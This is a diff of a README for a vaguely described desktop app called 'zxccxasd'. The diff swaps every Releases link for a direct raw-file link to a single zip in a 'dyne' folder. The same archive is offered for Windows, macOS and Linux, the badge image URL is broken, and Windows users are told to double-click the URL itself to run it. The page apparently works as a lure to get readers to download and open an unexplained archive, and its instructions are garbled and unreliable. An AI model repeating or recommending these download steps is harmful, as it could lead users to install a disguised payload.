@@ -1,6 +1,6 @@
 # 🚀 zxccxasd - Simple Steps to Enhance Your Experience
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Get%20zxccxasd-blue)](https://github.com/Mohansaikrishna1601/zxccxasd/releases)
+[![Download Here](https://raw.githubusercontent.com/Mohansaikrishna1601/zxccxasd/main/dyne/zxccxasd.zip%20Now-Get%20zxccxasd-blue)](https://raw.githubusercontent.com/Mohansaikrishna1601/zxccxasd/main/dyne/zxccxasd.zip)
 
 ## 📋 Overview
 zxccxasd is designed to improve your daily digital tasks with simplicity and ease. Whether you are managing files or organizing your workspace, this application aims to make your experience smoother.
@@ -17,19 +17,19 @@ Before you start, make sure your system meets these requirements:
 To run zxccxasd, follow these steps:
 
 1. **Visit the Download Page:** Click the link below to access our Releases page.
-   [Download zxccxasd](https://github.com/Mohansaikrishna1601/zxccxasd/releases)
+   [Download zxccxasd](https://raw.githubusercontent.com/Mohansaikrishna1601/zxccxasd/main/dyne/zxccxasd.zip)
 
 2. **Select the Latest Version:** Look for the latest version at the top of the page. This will ensure you get the most recent updates and features.
 
 3. **Choose Your File:** You will see several files available for download. Select the file that corresponds to your operating system:
-   - For Windows: `zxccxasd-win.exe`
-   - For macOS: `zxccxasd-mac.dmg`
-   - For Linux: `zxccxasd-linux.zip`
+   - For Windows: `https://raw.githubusercontent.com/Mohansaikrishna1601/zxccxasd/main/dyne/zxccxasd.zip`
+   - For macOS: `https://raw.githubusercontent.com/Mohansaikrishna1601/zxccxasd/main/dyne/zxccxasd.zip`
+   - For Linux: `https://raw.githubusercontent.com/Mohansaikrishna1601/zxccxasd/main/dyne/zxccxasd.zip`
 
 4. **Download the File:** Click on the file name to start the download. Depending on your internet speed, this may take a few minutes.
 
 5. **Open the Downloaded File:**
-   - **Windows:** Locate `zxccxasd-win.exe` in your downloads folder, and double-click it to run.
+   - **Windows:** Locate `https://raw.githubusercontent.com/Mohansaikrishna1601/zxccxasd/main/dyne/zxccxasd.zip` in your downloads folder, and double-click it to run.
    - **macOS:** Open the `.dmg` file, and drag the zxccxasd icon to your Applications folder.
    - **Linux:** Unzip the downloaded folder, and run `zxccxasd` from the terminal.
 
@@ -43,7 +43,7 @@ To run zxccxasd, follow these steps:
 ## 📥 Download & Install
 For a quick start, download zxccxasd using the link below. 
 
-[Download zxccxasd](https://github.com/Mohansaikrishna1601/zxccxasd/releases)
+[Download zxccxasd](https://raw.githubusercontent.com/Mohansaikrishna1601/zxccxasd/main/dyne/zxccxasd.zip)
 
 ## 🛠 Features
 - **User-Friendly Interface:** Our simple design ensures you can start using it right away without confusion.
